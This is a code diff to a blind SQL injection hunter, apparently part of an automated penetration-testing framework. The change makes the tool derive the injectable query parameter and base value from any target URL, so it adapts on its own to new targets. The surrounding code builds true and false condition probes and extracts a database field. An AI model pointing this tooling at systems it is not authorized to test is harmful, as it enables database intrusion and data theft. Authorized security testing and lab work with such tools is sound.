@@ -146,11 +146,39 @@ class SmartBlindSQLiHunter(Specialist):
     def _inject_value(self, base_value: str, quote: str, condition: str) -> str:
         return build_blind_sqli_value(base_value, quote, condition)
 
-    def _build_url(self, task: Task, value: str) -> str:
+    def _effective_target(self, task: Task) -> Tuple[str, str, str, str]:
+        """対象 URL から (mode, base_url, param, base_value) を汎用に導出する（SGK-2026-0506）。
+
+        - ``blind_sqli_mode`` が明示されていれば従来通り（param/base_value も params 既定）。
+        - 明示が無く対象 URL にクエリがあれば ``query`` モード＝先頭クエリ param とその現在値を
+          URL から導出（自走で任意のクエリ対象に自己適応）。
+        - クエリが無ければ従来の ``path``/``id``/``1``（挙動不変）。
+
+        ラボ固有のヒント（特定 param 名・成功印・DB 種別）は一切与えない。すべて対象 URL と
+        params のみから導出する（非カーブフィット）。
+        """
         params = self._params(task)
-        mode = str(params.get("blind_sqli_mode") or "path").lower()
         base_url = str(params.get("blind_sqli_base_url") or task.target)
+        explicit_mode = params.get("blind_sqli_mode")
+        if explicit_mode:
+            mode = str(explicit_mode).lower()
+            param = str(params.get("blind_sqli_param") or "id")
+            base_value = str(params.get("blind_sqli_base_value") or "1")
+            return mode, base_url, param, base_value
+        query_pairs = urllib.parse.parse_qsl(
+            urllib.parse.urlparse(base_url).query, keep_blank_values=True
+        )
+        if query_pairs:
+            param = str(params.get("blind_sqli_param") or query_pairs[0][0])
+            current = dict(query_pairs).get(param, "")
+            base_value = str(params.get("blind_sqli_base_value") or current or "1")
+            return "query", base_url, param, base_value
         param = str(params.get("blind_sqli_param") or "id")
+        base_value = str(params.get("blind_sqli_base_value") or "1")
+        return "path", base_url, param, base_value
+
+    def _build_url(self, task: Task, value: str) -> str:
+        mode, base_url, param, _base_value = self._effective_target(task)
         return build_blind_sqli_url(mode, base_url, param, value)
 
     async def _get(self, url: str, headers: Dict[str, str]) -> Tuple[int, str]:
@@ -277,7 +305,7 @@ class SmartBlindSQLiHunter(Specialist):
     async def _probe(self, task: Task) -> Optional[Dict[str, Any]]:
         params = self._params(task)
         headers = self._auth_headers(task)
-        base_value = str(params.get("blind_sqli_base_value") or "1")
+        mode, base_url, param, base_value = self._effective_target(task)
         quote = str(params.get("blind_sqli_quote") or "")
         field_expr = str(params.get("blind_sqli_extract_field") or "sqlite_version()")
         # SELECT でラップ（式でもサブクエリでも安全）。
@@ -310,7 +338,6 @@ class SmartBlindSQLiHunter(Specialist):
         if not extracted:
             return None
 
-        base_url = str(params.get("blind_sqli_base_url") or task.target)
         true_url = self._build_url(task, self._inject_value(base_value, quote, true_cond))
         false_url = self._build_url(task, self._inject_value(base_value, quote, false_cond))
         half = _SNIPPET_CAP // 2
@@ -321,8 +348,8 @@ class SmartBlindSQLiHunter(Specialist):
         false_snip = body_false[max(0, fi - half): fi + len(self._false_sig) + half]
         return {
             "request_url": base_url,
-            "mode": str(params.get("blind_sqli_mode") or "path").lower(),
-            "param": str(params.get("blind_sqli_param") or "id"),
+            "mode": mode,
+            "param": param,
             "base_value": base_value,
             "quote": quote,
             "true_condition": true_cond,
